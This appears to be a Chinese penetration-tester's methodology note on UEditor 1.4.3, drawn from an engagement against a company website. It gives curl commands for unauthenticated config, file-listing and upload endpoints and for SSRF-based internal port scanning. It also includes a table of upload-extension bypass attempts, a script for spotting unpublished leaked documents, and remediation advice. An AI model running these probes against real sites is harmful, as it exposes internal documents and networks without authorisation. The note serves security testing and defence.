# UEditor 组件面方法论（未授权接口 / 配置泄露 / SSRF / 上传）

> 沉淀自 2026-10 某上市公司官网实战（自研 CMS + UEditor 1.4.3）。UEditor 是国内老牌富文本编辑器，在 WooYun 文件上传案例中占 **12%**（见 `../dictionaries/chinese-srcfingerprints.md` §2.2），常被直接放在 Web 根目录下（`/ueditor/`，也见过 `/ue/`）且**不做任何鉴权**。它的价值不在"能 getshell"（**本次实测的 PHP 版未找到 RCE 路径**，源码级结论见 §5），而在**一整套免登录接口**：配置泄露、目录枚举、SSRF、文件上传。
> 配套阅读：编码/解析差异类绕过见 `../playbooks/encoding-charset-boundary.md`；SSRF 通用手法见 `../playbooks/ssrf.md`；上传扩展名绕过见 `../playbooks/file-upload.md`。

---

## 1. 触发信号 / 识别

命中任一即进入本笔记：

| 信号 | 说明 |
|---|---|
| 目录枚举出现 `/ueditor/`（标准命名）或 **`/ue/`**（本次实测的非标准命名） | 根目录或子目录；**目录名可自定义，不要只按 `/ueditor/` 找** |
| `?action=config` 返回 JSON 且含 `imageActionName`/`imageAllowFiles` | **UEditor 后端活着** |
| 页面 JS 里出现 `UEDITOR_HOME_URL` / `ueditor.all.js` / `UE.version` | 前端在用 |
| `config.json` 里含 `imagePathFormat`/`catcherLocalDomain` | 确认后端配置 |

**版本判定**：`/ueditor/ueditor.all.js` 头部注释与 `UE.version`：
```
/*!
 * UEditor
 * version: ueditor
 * build: Wed Aug 10 2016 11:06:02 GMT+0800 (CST)
 */
...
UE.version = "1.4.3";
```
> 本次实测版本 = **1.4.3**（2016-08-10 构建）。

**探测一行命令**：
```bash
# 同时输出状态码 + 响应体大小 + 特征串 —— 因为「不存在路径」的返回形态因站而异、且会变
for p in /ueditor/php/controller.php /ue/php/controller.php /ueditor/controller.jsp /ueditor/net/controller.ashx; do
  curl -s -o /tmp/u -w "%{http_code} %{size_download}B  $p\n" "https://target${p}?action=config"
  grep -q 'imageActionName' /tmp/u && echo "      ↑ 命中 UEditor（config 返回 JSON）"
done
```
> **⚠️ 枚举纪律（本次踩过）**：**「不存在路径」的返回形态因站而异，同一站点在不同时点也可能不同** —— 本次目标**两个时点**各观测到一种形态：
> - 时点 1：`/ue/` 下路径**一律回落首页**（200 / 45942B，连 `/ue/ueditor.config.js` 也返回首页）
> - 时点 2：`/ue/README.md`→**404**、`/ue/`→**403**、`/ue/ueditor.config.js`→**200 / 5018B**（真实文件）
>
> → 所以：**① 不能只看状态码**（可能是 200 回落页）；**② 用「响应体大小 + 特征串」双判据**（如 grep `imageActionName`）；**③ 结论记快照时间**（对齐 `../notes/self-check-methodology.md` §4.4「结论有时效性」）。

---

## 2. 未授权接口清单（**全部无需认证**，实测确认）

| action | 端点 | 泄露 / 能力 | 风险 |
|---|---|---|---|
| `config` | `controller.php?action=config` | 完整配置：允许扩展名、大小上限、路径格式、`catcherLocalDomain` | 信息泄露 |
| **`listfile`** | `...?action=listfile` | **列出 `/upload/file/` 全部文件名 + 时间戳** | **内部文档泄露** |
| **`listimage`** | `...?action=listimage` | 列出 `/upload/image/` 全部文件名 | 信息泄露 |
| **`catchimage`** | `...?action=catchimage&source[]=<url>` | **服务端请求任意 URL** | **SSRF** |
| `uploadimage` / `uploadfile` / `uploadvideo` | `POST ...?action=upload*`，字段 `upfile` | **未授权上传**（扩展名白名单内） | 未授权写 |
| `uploadscrawl` | `POST ...?action=uploadscrawl`，字段 `upfile`=base64 | 同上，落盘固定 `.png` | 未授权写 |

**判据**：请求**不带任何 Cookie** 返回 `{"state":"SUCCESS",...}` 即命中（对齐 `../playbooks/pre-auth-surface.md` §3 的"严格口径"）。

> **本清单的三个动作常常被漏掉**：`listfile`/`listimage` 是**目录枚举接口**，`catchimage` 是 **SSRF 入口** —— 只测 `upload*` 会漏掉这两类。

---

## 3. `listfile` / `listimage`：上传目录枚举（最容易出「内部文档泄露」）

**做法**：直接 GET，拿到的 JSON 里是 `/upload/file/` 下的完整文件清单。逐个下载 + **与公开页面比对**，找出"未被任何页面引用"的文件 —— 那些就是**未公开的内部文档**。

**比对脚本**（判断哪些文件从未在公开页面出现）：
```python
import json, glob, os
d = json.load(open('listfile.json'))          # 先把 ?action=listfile 的响应存成这个文件
blob = "".join(open(f, encoding='utf-8', errors='replace').read() for f in glob.glob('pages/*.html'))
for x in d['list']:
    name = os.path.basename(x['url'])
    print(('⚠️ 未公开 ' if blob.count(name) == 0 else '公开引用 ') + x['url'])
```
> **⚠️ 该判定依赖语料完整性**：`pages/` 里的公开页面越全，判定越准；页面少会**高估**"未公开"数（本次实测：36 个页面 → 15/20；只用 1 个页面 → 20/20）。报告里给数字时**注明语料规模**。

**本次实测结果**：20 个文件中 **15 个从未在公开页面出现**（语料 = 36 个已抓取页面），含
- 《…**2025/2026 年年审会计师事务所邀请招标综合评价考评打分表**》（xlsx，内部采购评审标准，含完整评分规则与权重）
- 公司公告类 PDF（WPS 生成，`/Title` 元数据可读）
- 未发布的宣传视频

**证据纪律**：只截取**能证明泄露的最小片段**，报告内脱敏；**不下载与漏洞证明无关的文档**（对齐 `../../SKILL.md` Phase 5 与测试痕迹清单）。

---

## 4. `catchimage`：SSRF（**盲 SSRF + 端口探测 + 内容落盘**）

**端点**：`controller.php?action=catchimage&source[]=<url>`（`source` 为数组参数）

**三层能力**（由 `Uploader.class.php` 的 `saveRemote()` 实现）：

```
① get_headers($url)      → 服务器主动请求目标
② readfile($url)         → 再次请求，响应体写入磁盘
③ 落盘文件可由攻击者下载  → 【读内网响应内容】
```

**判据**（服务端只回两种状态串，据此当端口扫描器用）：

> **⚠️ 读法提示**：UEditor 的 JSON 响应把中文编码成 **Unicode 转义序列**（形如 `\u` 加四位十六进制）—— **curl 直接看到的不是可读中文**。
> **下文（判据表 + 实测示例）为可读起见显示解码后的文字**；脚本里做判据要先 `json.loads` 再比对。
> **⚠️ 判据字段别取错**：中文状态串在 **`list[*].state`** 里；顶层 `state` 只有 `SUCCESS`/`ERROR` 两个值（`action_crawler.php` 按 `count($list)` 决定，**`source` 列表非空即为 `SUCCESS`，哪怕每一项都失败**）→ 别拿顶层 `state` 当判据。**参数形态**：`source` 必须传成数组（`source[]=<url>` 落进 PHP 的 `$_GET['source']`）；传标量会让后端的 `foreach ($source as ...)` 直接失败。

| 返回（解码后） | 含义 | 源码对应 |
|---|---|---|
| `链接contentType不正确` | **拿到 200 OK** → 端口连通 | `ERROR_HTTP_CONTENTTYPE`（过了 `get_headers` 的 200 检查） |
| `链接不可用` | **拿不到 200 OK** → 端口不通 | `ERROR_DEAD_LINK` |

> 注意：`contentType不正确` 这个状态名有误导性 —— 它实际是"**请求成功了，但卡在后续格式校验**"，所以它 = **连通**。

**本次实测**：
```bash
# 连通（Web 服务本身）
curl "...?action=catchimage&source%5B%5D=http%3A%2F%2F127.0.0.1%3A80%2F"
# → 链接contentType不正确

# 不通（MySQL/Redis/SSH/宝塔 8888 全不通）
curl "...?action=catchimage&source%5B%5D=http%3A%2F%2F127.0.0.1%3A3306%2F"
# → 链接不可用

# 外网（出站被阻断）
curl "...?action=catchimage&source%5B%5D=http%3A%2F%2Fexample.com%2F"
# → 无响应（超时）
```

**内容落盘读取**（要求目标返回 200 且 URL 以图片扩展名结尾）：
```bash
# 1. 抓取（URL 需以 .gif/.jpg 等结尾才能过格式校验）
curl "...?action=catchimage&source%5B%5D=http%3A%2F%2F127.0.0.1%2F%3Fx%3Da.gif"
# → {"state":"SUCCESS","url":"/upload/image/.../xxx.gif"}
# 2. 下载落盘文件 = 服务器抓到的内网响应原文
curl "https://target/upload/image/.../xxx.gif"
```

---

## 5. 上传：**未授权成立，但本次未找到 RCE 路径**（实测结论）

**未授权**：`POST ...?action=uploadimage`，`-F "upfile=@file;filename=x.gif"`，**不带 Cookie** → `{"state":"SUCCESS","url":"/upload/image/YYYYMMDD/....gif"}`，且文件**公网可直读**。

**扩展名白名单（实测极严，以下全部被拒）**：

| 绕过尝试 | 结果 |
|---|---|
| `.php` / `.PHP`（大写）/ `.php5` / `.phtml` / `.phar` | ❌ 拒绝 |
| 尾部点 `.php.` / 尾部空格 `.php ` / NULL `%00` / `::$DATA` / 分号 `.php;.gif` | ❌ 拒绝 |
| 双扩展名 `.php.gif` | ⚠️ 接受但**落盘为 `.gif`**（不可执行） |
| `filename` 查询参数注入 | ❌ 无效 |
| 配置覆盖 `?imageAllowFiles[]=.php` | ❌ 无效（`controller.php` 的 `$CONFIG` 只从 `config.json` 读，**不合并请求参数**） |
| **nginx path-info**（`xxx.gif/probe.php`、`%00.php`、`;.php`） | ❌ 404/400（nginx 配置正确，未把 `.gif` 交给 PHP-FPM） |

**源码级结论**（对照 UEditor 1.4.3 官方源码 `Uploader.class.php`）：
- `upFile()`：`checkType()` 与落盘扩展名**取自同一个点**（`strrchr($oriName,'.')`）→ 无错位
- `upBase64()`：`$this->oriName = $this->config['oriName']` —— **硬编码 `scrawl.png`**，扩展名用户不可控
- `saveRemote()`：校验用 `strrchr($imgUrl,'.')`、落盘用 `strrchr($oriName,'.')`，而 `oriName` = **URL 末段整体** → **两者是同一个点**，无错位（**曾误判为可利用，已实测否证**）

> **教训**：看到"两处用了不同的取值方式"不要直接推结论，**必须实测**。本次曾据源码推断 `saveRemote()` 存在扩展名错位可 getshell，实测落盘仍是 `.gif`。

**未授权上传的真实危害**（**本次**未找到 RCE 路径，但危害仍够高）：
1. **存储耗尽 DoS** —— 单文件上限 + **无频率限制**。注意**上限是可配置的**：UEditor 1.4.3 **官方默认** `fileMaxSize` = 51.2MB（51,200,000B）、`imageMaxSize` = 2MB；**本次目标把它放大到 512MB / 20MB（各 10 倍）** —— 遇到时先读 `?action=config` 确认实际值，**不要把目标的配置当成默认值**。
2. **信誉滥用** —— 文件由企业域名对外提供，可托管恶意压缩包/文档
3. 若站点允许 **`.svg`/`.html`**（**看 `fileAllowFiles` 实际值**），则为**存储型 XSS**（`.svg` 以 `image/svg+xml` 渲染可执行脚本、`.html` 以 `text/html` 渲染）。**注意**：官方默认白名单里含 `.txt`/`.md`/`.xml`，但 **`.xml` 不必然构成 XSS**（浏览器以 `application/xml` 渲染只显示树、不执行脚本，需 XSL 或按 HTML 渲染才行）—— 别把"允许 .xml"直接写成存储型 XSS。本次目标已把 `.txt`/`.md`/`.xml` 从白名单删掉。

---

## 6. 修复建议（给甲方的三条）

1. **若前台已不用 UEditor → 直接删除目录**（`rm -rf /www/wwwroot/<site>/ue/`）
2. **保留组件 → 在 `controller.php` 入口加后台会话鉴权**；`listfile`/`listimage` 建议直接禁用（前台编辑器不需要"列出全部历史文件"）
3. **数据面**：把内部文档移出 Web 目录（如 `/www/data/internal_docs`），或对 `/upload/file/` 加来源访问控制

---

## 7. 实战数据（2026-10 某上市公司官网）

| 项 | 值 |
|---|---|
| 版本 | UEditor **1.4.3**（2016-08-10） |
| 位置 | `/ue/`（根目录下，非标准 `/ueditor/`） |
| 是否经 WAF 可达 | **是** —— 经天翼云 WAF 的公网路径同样可访问全部接口（不需要源站 IP） |
| `listfile` 泄露 | 20 个文件，**15 个**未公开（语料 = 36 个已抓页面），含内部招标评审打分表 |
| SSRF | 内网仅 80 端口可达，出站被阻断 |
| 上传 | 未授权成立；扩展名白名单严，**本次未找到 RCE 路径** |
| 相关发现 | 同站的 PHP **错误回显开启**（`display_errors = On`），`action_crawler.php`/`action_list.php` 直接吐出绝对路径 `/www/wwwroot/<site>/...` |
